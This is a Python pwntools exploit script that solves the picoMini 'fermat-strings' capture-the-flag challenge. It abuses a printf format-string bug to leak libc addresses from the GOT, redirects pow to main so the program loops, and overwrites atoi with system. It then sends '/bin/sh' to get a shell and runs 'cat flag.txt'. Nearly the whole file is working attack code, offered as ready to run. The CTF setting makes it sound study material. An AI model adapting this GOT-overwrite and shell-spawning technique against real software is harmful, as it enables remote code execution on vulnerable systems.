#!/usr/bin/env python3
# fermat-strings - picoMini by redpwn (Binary Exploitation, Hard) by notdeghost
# Format-string vuln: snprintf(buffer,...,A,B); printf(buffer);
# 1) one shot: leak puts()+atoi() from GOT AND overwrite pow@got = main  -> loop
# 2) overwrite atoi@got = system
# 3) A = "/bin/sh"  ->  atoi("/bin/sh") == system("/bin/sh")
from pwn import *

context.arch = "amd64"
context.log_level = "info"
exe = ELF("./chall", checksec=False)

HOST = args.HOST or "mars.picoctf.net"
PORT = int(args.PORT or 31929)

# glibc 2.31-0ubuntu9.x (from challenge Dockerfile / libc-database)
LIBC_PUTS = 0x875A0
LIBC_SYSTEM = 0x55410


def conn():
    return remote(HOST, PORT)


def send_payload(io, a, b):
    io.sendlineafter(b"A: ", a)
    io.sendlineafter(b"B: ", b)


def send_format(io, fmt, values):
    format_prefix = b"111_"
    values_prefix = b"1111111_"
    send_payload(io, format_prefix + fmt, values_prefix + values)
    out = io.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    return res


def main():
    fmt_first_offset = 43
    o = conn()

    # stage 1: leak puts()/atoi() and write pow@got = main (single printf)
    loop_main_fmt, loop_main_address = fmtstr_split(
        fmt_first_offset + 2, {exe.got["pow"]: exe.symbols["main"]}, numbwritten=0x25
    )
    output = send_format(
        o,
        f"%{fmt_first_offset}$s.%{fmt_first_offset + 1}$s.".encode() + loop_main_fmt,
        p64(exe.got["puts"]) + p64(exe.got["atoi"]) + loop_main_address,
    )

    puts_str, atoi_str, *rest = output.split(b".")
    puts_addr = int.from_bytes(puts_str, "little")
    atoi_addr = int.from_bytes(atoi_str, "little")
    log.info("puts = %s", hex(puts_addr))
    log.info("atoi = %s", hex(atoi_addr))

    assert (puts_addr - atoi_addr) == (LIBC_PUTS - 0x47730), hex(puts_addr - atoi_addr)
    libc_base = puts_addr - LIBC_PUTS
    system_addr = libc_base + LIBC_SYSTEM
    log.info("libc base = %s  system = %s", hex(libc_base), hex(system_addr))
    assert libc_base & 0xFFF == 0

    # stage 2: atoi@got = system
    atoi_fmt, atoi_addrs = fmtstr_split(
        fmt_first_offset, {exe.got["atoi"]: system_addr}, numbwritten=0x17
    )
    send_format(o, atoi_fmt, atoi_addrs)

    # stage 3: atoi("/bin/sh") == system("/bin/sh")
    send_payload(o, b"/bin/sh", b"dummy")

    o.sendline(b"cat flag.txt; echo PWNED")
    try:
        data = o.recvuntil(b"PWNED", timeout=6)
    except EOFError:
        data = b""
    print(data.decode(errors="replace"))
    import re

    m = re.search(rb"picoCTF\{[^}]+\}", data)
    if m:
        print("\n[+] FLAG:", m.group(0).decode())
    o.close()


if __name__ == "__main__":
    main()
